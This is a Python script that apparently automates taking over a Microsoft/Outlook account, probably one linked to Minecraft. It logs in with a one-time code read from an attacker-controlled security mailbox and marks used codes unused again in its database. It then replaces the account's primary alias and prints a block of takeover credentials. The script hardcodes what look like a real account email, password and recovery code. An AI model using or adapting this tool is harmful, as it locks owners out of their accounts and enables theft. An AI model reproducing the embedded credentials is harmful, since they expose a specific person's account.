"""OTP login → change_primary_alias (tests SA elevation + ProofConfirmation)."""
from __future__ import annotations

import asyncio
import logging
import uuid

logging.basicConfig(level=logging.INFO, format="%(levelname)s %(name)s: %(message)s")

from database.database import DBConnection
from securing.auth.get_msaauth import get_msaauth
from securing.auth.handle_redirects import get_data, handle_redirects
from securing.auth.initial_session import get_session
from securing.auth.polish_host import polish_host
from securing.auth.send_auth import send_auth
from securing.utils.cookies.get_cookies import get_cookies
from securing.utils.cookies.get_email_code import get_email_code
from securing.utils.cookies.get_livedata import livedata
from securing.utils.proxy import close_session
from securing.utils.security.change_primary_alias import (
    _get_manage,
    change_primary_alias,
)
from securing.utils.security_information import _page_id

EMAIL = "amazing_fam.iyq28s64@outlook.com"
SEC = "b7419f2164e04615@ilovevbucks.site"
PWD = "BbfaNujX1rcKRq"
RC = "R3ATA-GE79D-C3R9F-NQ8QT-QUJ38"


async def main() -> None:
    with DBConnection() as db:
        db.add_security_email(SEC, PWD)
        # Un-consume recent OTCs so a stale mark doesn't block us if MS reuses timing
        db.cursor.execute(
            "UPDATE received_emails SET consumed=0 WHERE lower(to_address)=? AND consumed=1 "
            "AND id = (SELECT MAX(id) FROM received_emails WHERE lower(to_address)=?)",
            (SEC.lower(), SEC.lower()),
        )

    session = get_session()
    try:
        info = await send_auth(session, EMAIL, SEC)
        proofs = (
            (info.get("response") or {})
            .get("Credentials", {})
            .get("OtcLoginEligibleProofs")
            or []
        )
        if not proofs:
            print("no proofs")
            return
        flowtoken = proofs[0]["data"]
        print("waiting login OTP…")
        code = await get_email_code(SEC, timeout=150)
        print("login OTP", code)
        if not code:
            return

        live = await livedata(session)
        msa = await get_msaauth(
            session,
            EMAIL,
            flowtoken,
            {"urlPost": live["urlPost"], "ppft": info.get("ppft") or live["ppft"]},
            code,
        )
        if isinstance(msa, str):
            handled = await handle_redirects(session, msa)
            msa = handled if isinstance(handled, dict) else get_data(msa)
        if not msa:
            print("login failed")
            return
        await polish_host(session, msa if isinstance(msa, dict) else {})
        print("polished")

        html, canary, emails = await _get_manage(session)
        print("pre-elevate", _page_id(html), bool(canary), emails[:6])

        api = await get_cookies(session)
        local = f"sunny{uuid.uuid4().hex[:12]}"
        ok = await change_primary_alias(
            session,
            local,
            api,
            security_email=SEC,
            account_email=EMAIL,
            password=PWD,
        )
        _, _, after = await _get_manage(session)
        print("PRIMARY_OK", ok, local)
        print("after", after)
        print("\n=== CREDENTIALS ===")
        print("original:", EMAIL)
        print("primary:", f"{local}@outlook.com" if ok else EMAIL)
        print("security:", SEC)
        print("password:", PWD, "(may be unverified — use OTP login if needed)")
        print("recovery:", RC)
        print("mc: Amazing_fam")
    finally:
        await close_session(session)


if __name__ == "__main__":
    asyncio.run(main())
